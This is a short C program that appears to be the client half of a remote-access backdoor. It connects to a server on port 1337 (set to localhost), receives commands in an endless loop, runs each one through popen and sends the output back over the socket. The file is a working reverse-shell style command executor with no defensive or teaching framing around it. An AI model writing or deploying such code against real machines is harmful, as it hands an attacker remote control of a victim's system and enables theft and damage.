// Client code

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

#define PORT 1337

int main() {
    int clientSocket;
    struct sockaddr_in serverAddr;
    socklen_t addr_size;
    char buffer[1024];

    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    addr_size = sizeof(serverAddr);
    connect(clientSocket, (struct sockaddr*)&serverAddr, addr_size);

    // Remote command execution loop
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        recv(clientSocket, buffer, sizeof(buffer), 0);
        printf("[+] Command received: %s", buffer);
        
        if (strcmp(buffer, "exit\n") == 0) {
            printf("[-] Connection closed by server.\n");
            break;
        }

        FILE* fp = popen(buffer, "r");
        if (fp == NULL) {
            perror("[-] Error executing command.\n");
            exit(1);
        }

        memset(buffer, 0, sizeof(buffer));
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send(clientSocket, buffer, strlen(buffer), 0);
            memset(buffer, 0, sizeof(buffer));
        }

        pclose(fp);
    }

    close(clientSocket);

    return 0;
}